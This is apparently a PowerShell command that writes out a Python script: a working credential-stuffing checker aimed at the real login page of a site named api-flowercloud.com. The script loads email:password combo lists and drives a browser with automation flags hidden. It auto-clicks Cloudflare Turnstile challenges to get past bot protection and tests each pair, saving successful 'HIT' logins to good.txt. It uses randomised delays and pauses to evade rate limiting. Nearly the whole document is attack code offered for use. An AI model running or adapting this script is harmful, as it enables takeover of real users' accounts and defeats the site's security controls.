@"
"""
花云 CF 绕过 + 批量登录验证 (最终修正版)
安装: pip install DrissionPage
运行前: taskkill /F /IM chrome.exe /T
"""

import sys
import os
import time
import random

try:
    from DrissionPage import ChromiumPage, ChromiumOptions
except ImportError:
    print("[!] pip install DrissionPage")
    sys.exit(1)

TARGET_BASE = "https://api-flowercloud.com"
LOGIN_PAGE = TARGET_BASE + "/index.php?rp=/login"
COMBO_FILE = "combo_f.txt"
GOOD_FILE = "good.txt"
BAD_FILE = "bad.txt"
MAX_CF_WAIT = 120
DELAY_BETWEEN = 3
CHROME_PATH = None

def find_browser():
    paths = [r"C:\Program Files\Google\Chrome\Application\chrome.exe",r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"]
    for p in paths:
        if os.path.exists(p):
            return p
    return None

def is_challenge_page(page):
    try:
        url = page.url.lower() if page.url else ""
        title = page.title.lower() if page.title else ""
        if "api-flowercloud.com" in url and ("clientarea" in url or "index.php" in url or "cart.php" in url):
            return False
        signs = ["just a moment", "checking your browser", "attention required"]
        if any(s in title for s in signs):
            return True
        try:
            html_head = page.html[:1500].lower() if page.html else ""
            if "cf-chl-widget" in html_head or "challenge-platform" in html_head:
                return True
        except:
            pass
        return False
    except:
        return True

def try_click_turnstile(page):
    try:
        iframes = page.eles("tag:iframe")
        for iframe in iframes:
            src = iframe.attr("src") or ""
            if "challenges.cloudflare.com" in src or "turnstile" in src:
                try:
                    iframe.click()
                    return True
                except:
                    pass
    except:
        pass
    try:
        cf_div = page.ele("css:.cf-turnstile", timeout=2)
        if cf_div:
            cf_div.click()
            return True
    except:
        pass
    return False

def wait_cf(page, max_wait=MAX_CF_WAIT):
    start = time.time()
    while time.time() - start < max_wait:
        if not is_challenge_page(page):
            return True
        try_click_turnstile(page)
        elapsed = int(time.time() - start)
        if elapsed % 10 == 0 and elapsed > 0:
            print("    ... CF (" + str(elapsed) + "s)")
        time.sleep(3)
    return not is_challenge_page(page)

def goto_and_pass_cf(page, url):
    page.get(url)
    time.sleep(3)
    if is_challenge_page(page):
        print("    [*] CF...")
        passed = wait_cf(page)
        if passed:
            print("    [+] CF OK")
            time.sleep(2)
            return True
        else:
            print("    [!] CF timeout")
            return False
    return True

def do_login(page, email, password):
    if not goto_and_pass_cf(page, LOGIN_PAGE):
        return "error"
    time.sleep(3)
    try:
        email_input = None
        for sel in ['#inputEmail', 'input[name="username"]', 'input[type="email"]', 'input[name="email"]']:
            try:
                email_input = page.ele(sel, timeout=5)
                if email_input:
                    break
            except:
                continue
        if not email_input:
            print("    [!] no email input, url=" + str(page.url)[:60])
            return "error"
        pass_input = None
        for sel in ['#inputPassword', 'input[name="password"]', 'input[type="password"]']:
            try:
                pass_input = page.ele(sel, timeout=3)
                if pass_input:
                    break
            except:
                continue
        if not pass_input:
            print("    [!] no pass input")
            return "error"
        email_input.click()
        time.sleep(0.2)
        email_input.input("", clear=True)
        time.sleep(0.1)
        email_input.input(email)
        time.sleep(0.3)
        pass_input.click()
        time.sleep(0.2)
        pass_input.input("", clear=True)
        time.sleep(0.1)
        pass_input.input(password)
        time.sleep(0.5)
        btn = None
        for sel in ['input[type="submit"]', 'button[type="submit"]', '#login', '.btn-primary[type="submit"]']:
            try:
                btn = page.ele(sel, timeout=2)
                if btn:
                    break
            except:
                continue
        if btn:
            btn.click()
        else:
            pass_input.input("{ENTER}")
        time.sleep(5)
        if is_challenge_page(page):
            wait_cf(page, 60)
            time.sleep(3)
        final_url = page.url if page.url else ""
        if "incorrect" in final_url.lower():
            return "bad"
        if "clientarea.php" in final_url.lower() and "incorrect" not in final_url.lower() and "login" not in final_url.lower():
            return "good"
        try:
            page_html = page.html.lower() if page.html else ""
            if "logout.php" in page_html:
                return "good"
            if "incorrect" in page_html or "invalid" in page_html:
                return "bad"
        except:
            pass
        return "bad"
    except Exception as e:
        print("    [!] " + str(e))
        return "error"

def save_result(filename, content):
    f = open(filename, "a", encoding="utf-8")
    f.write(content)
    f.write(os.linesep)
    f.close()

def main():
    print("")
    print("  花云 CF + 批量登录")
    print("")
    if not os.path.exists(COMBO_FILE):
        print("[!] no " + COMBO_FILE)
        sys.exit(1)
    f = open(COMBO_FILE, "r", encoding="utf-8")
    lines = [l.strip() for l in f.readlines() if ":" in l.strip()]
    f.close()
    if not lines:
        print("[!] combo empty")
        sys.exit(1)
    print("[+] " + str(len(lines)) + " accounts")
    global CHROME_PATH
    if not CHROME_PATH:
        CHROME_PATH = find_browser()
    if not CHROME_PATH:
        print("[!] no browser")
        sys.exit(1)
    print("[+] " + CHROME_PATH)
    co = ChromiumOptions()
    co.set_browser_path(CHROME_PATH)
    co.set_argument("--start-maximized")
    co.set_argument("--disable-blink-features=AutomationControlled")
    co.set_argument("--no-first-run")
    co.set_argument("--no-default-browser-check")
    try:
        page = ChromiumPage(co)
    except Exception as e:
        print("[!] " + str(e))
        print("run: taskkill /F /IM chrome.exe /T")
        sys.exit(1)
    print("[+] browser OK")
    print("[*] first visit...")
    page.get(TARGET_BASE + "/clientarea.php")
    time.sleep(5)
    if is_challenge_page(page):
        print("[*] CF detected, clicking...")
        passed = wait_cf(page)
        if not passed:
            print("[!] auto failed, click manually then press Enter")
            input()
    page_size = len(page.html) if page.html else 0
    print("[+] page size: " + str(page_size))
    if page_size < 5000:
        print("[!] too small, click CF manually then Enter")
        input()
    print("[+] CF passed, starting login")
    print("=" * 50)
    good = 0
    bad = 0
    err = 0
    total = len(lines)
    for i, line in enumerate(lines):
        parts = line.split(":", 1)
        if len(parts) != 2:
            continue
        email = parts[0].strip()
        password = parts[1].strip()
        print("[" + str(i+1) + "/" + str(total) + "] " + email)
        result = do_login(page, email, password)
        if result == "good":
            good += 1
            print("    >>> HIT <<<")
            save_result(GOOD_FILE, line)
        elif result == "bad":
            bad += 1
            print("    --- BAD ---")
            save_result(BAD_FILE, line)
        else:
            err += 1
            print("    !!! ERR !!!")
            save_result(BAD_FILE, line)
        print("    [H:" + str(good) + " B:" + str(bad) + " E:" + str(err) + "]")
        if i < total - 1:
            time.sleep(random.uniform(DELAY_BETWEEN, DELAY_BETWEEN + 2))
        if (i + 1) % 50 == 0:
            p = random.uniform(10, 20)
            print("[*] pause " + str(int(p)) + "s...")
            time.sleep(p)
    print("=" * 50)
    print("  DONE! H:" + str(good) + " B:" + str(bad) + " E:" + str(err))
    print("  " + GOOD_FILE + " / " + BAD_FILE)
    page.quit()

if __name__ == "__main__":
    main()
"@ | Out-File -FilePath "C:\Users\Administrator\Downloads\CloudflareBypassForScraping-main\flower_bypass.py" -Encoding utf8
